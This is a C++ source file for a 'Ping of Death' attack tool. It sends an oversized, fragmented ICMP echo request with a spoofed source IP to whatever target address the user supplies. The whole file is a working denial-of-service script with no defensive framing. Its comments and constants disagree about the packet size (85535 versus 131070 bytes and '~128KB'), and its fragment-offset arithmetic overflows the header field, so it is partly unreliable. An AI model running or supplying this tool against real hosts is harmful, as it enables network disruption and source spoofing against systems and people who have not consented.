#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <ctime>
#include <errno.h>

#define IP_MAXPACKET 65535
#define IP_HDRLEN 20
#define ICMP_HDRLEN 8
#define FRAG_SIZE 1472         // Common MTU - IP header (20 bytes)
#define POD_PACKET_SIZE 85535 // Much larger than IP_MAXPACKET for effective PoD

unsigned short checksum(void *vdata, size_t length)
{
    char *data = (char *)vdata;
    uint32_t sum = 0;

    // Sum up 16-bit words
    while (length > 1)
    {
        sum += *((uint16_t *)data);
        data += 2;
        length -= 2;
    }

    // Add left-over byte, if any
    if (length > 0)
    {
        sum += *(uint8_t *)data;
    }

    // Fold 32-bit sum to 16 bits
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    return (uint16_t)(~sum);
}

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        std::cerr << "Usage: sudo " << argv[0] << " <target_ip>\n";
        return 1;
    }

    const char *target_ip = argv[1];

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0)
    {
        perror("Socket creation failed");
        return 1;
    }

    int opt = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) < 0)
    {
        perror("setsockopt");
        return 1;
    }

    struct sockaddr_in dest{};
    dest.sin_family = AF_INET;
    if (inet_pton(AF_INET, target_ip, &dest.sin_addr) <= 0)
    {
        std::cerr << "Invalid target IP\n";
        return 1;
    }

    // Create a huge ICMP packet (much larger than IP max)
    const int icmp_packet_size = POD_PACKET_SIZE - IP_HDRLEN; // 131070 - 20 = 131050 bytes ICMP packet
    char *icmp_packet = new char[icmp_packet_size];
    memset(icmp_packet, 0, icmp_packet_size);

    // ICMP header at start of this packet
    struct icmphdr *icmp_hdr = (struct icmphdr *)icmp_packet;
    icmp_hdr->type = ICMP_ECHO;
    icmp_hdr->code = 0;
    icmp_hdr->un.echo.id = htons(1234);
    icmp_hdr->un.echo.sequence = htons(0);

    // Fill payload with pattern (e.g. 'A's)
    memset(icmp_packet + ICMP_HDRLEN, 'A', icmp_packet_size - ICMP_HDRLEN);

    // Calculate ICMP checksum over ICMP header + payload
    icmp_hdr->checksum = 0;
    icmp_hdr->checksum = checksum(icmp_packet, icmp_packet_size);

    // Buffer to hold one full IP packet fragment (header + fragment data)
    char packet[IP_HDRLEN + FRAG_SIZE];
    memset(packet, 0, sizeof(packet));

    struct ip *ip_hdr = (struct ip *)packet;

    // Fixed IP header fields
    ip_hdr->ip_v = 4;
    ip_hdr->ip_hl = 5; // header length in 32-bit words (20 bytes)
    ip_hdr->ip_tos = 0;
    ip_hdr->ip_id = htons(rand() % 65535);
    ip_hdr->ip_ttl = 64;
    ip_hdr->ip_p = IPPROTO_ICMP;
    ip_hdr->ip_src.s_addr = inet_addr("1.2.3.4"); // spoofed source IP
    ip_hdr->ip_dst = dest.sin_addr;

    // Fragment and send the large packet
    int offset = 0;
    int bytes_left = icmp_packet_size;
    int frag_count = 0;

    while (bytes_left > 0)
    {
        int frag_data_len = (bytes_left > FRAG_SIZE) ? FRAG_SIZE : bytes_left;

        // Fill fragment payload from icmp_packet
        memcpy(packet + IP_HDRLEN, icmp_packet + offset, frag_data_len);

        // Set IP header length (header + data)
        ip_hdr->ip_len = htons(IP_HDRLEN + frag_data_len);

        // Flags and fragment offset field
        // MF flag set if more fragments follow
        uint16_t ip_off = (offset >> 3);
        if (bytes_left > frag_data_len)
        {
            ip_off |= 0x2000; // More Fragments flag
        }
        ip_hdr->ip_off = htons(ip_off);

        // Recalculate IP checksum for this fragment
        ip_hdr->ip_sum = 0;
        ip_hdr->ip_sum = checksum(packet, IP_HDRLEN);

        // Send the fragment
        ssize_t sent_bytes = sendto(sock, packet, IP_HDRLEN + frag_data_len, 0,
                                    (struct sockaddr *)&dest, sizeof(dest));
        if (sent_bytes < 0)
        {
            perror("sendto");
            delete[] icmp_packet;
            close(sock);
            return 1;
        }
        else
        {
            std::cout << "[+] Fragment " << ++frag_count << " sent, size " << sent_bytes << " bytes\n";
        }

        offset += frag_data_len;
        bytes_left -= frag_data_len;

        usleep(10000); // Small delay between fragments (adjust or remove)
    }

    std::cout << "Ping of Death packet sent (fragmented ICMP Echo Request ~128KB).\n";

    delete[] icmp_packet;
    close(sock);
    return 0;
}
